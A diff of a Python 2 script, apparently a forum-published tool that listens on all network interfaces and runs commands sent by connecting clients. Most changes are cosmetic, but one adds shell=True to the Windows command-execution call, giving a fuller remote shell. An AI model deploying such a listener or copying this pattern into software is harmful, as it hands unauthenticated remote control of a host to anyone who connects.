@@ -8,6 +8,7 @@
 # Forum:        http://forum.openfire-security.net
 #
 # Created:     03/09/2013
+# Last_Update: 01/12/2014
 # Copyright:   (c) Xception 2013
 # Licence:     Open Source
 #-------------------------------------------------------------------------------
@@ -15,11 +16,11 @@
 import socket, sys, os, subprocess
 
 if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
-	SysClS = 'clear'
+    SysClS = 'clear'
 elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
-	SysCls = 'cls'
+    SysCls = 'cls'
 else:
-	SysCls = 'unknown'
+    SysCls = 'unknown'
 
 os.system(SysCls)
 
@@ -50,10 +51,10 @@ try:
     server_sock.bind(("0.0.0.0", port_bind))
     server_sock.listen(10)
 except Exception as e:
-    print "It seems you entered alpha character. PORT must be numberic (integer)"
+    print "It seems you entered alpha character. PORT must be numeric (integer)"
     sys.exit()
 except KeyboardInterrupt:
-    print "CTRL^C pressed, Shutting program"
+    print "\nCTRL^C pressed, Shutting program"
     sys.exit()
 
 
@@ -84,7 +85,7 @@ try:
                         print "Sent Command response to client"
                         continue
                     elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
-                        new_data = subprocess.Popen(data[10:],stdout=subprocess.PIPE).communicate()[0]
+                        new_data = subprocess.Popen(data[10:],stdout=subprocess.PIPE, shell=True).communicate()[0]
                         client.send("\n %s " % new_data)
                         print "Sent Command response"
                         continue
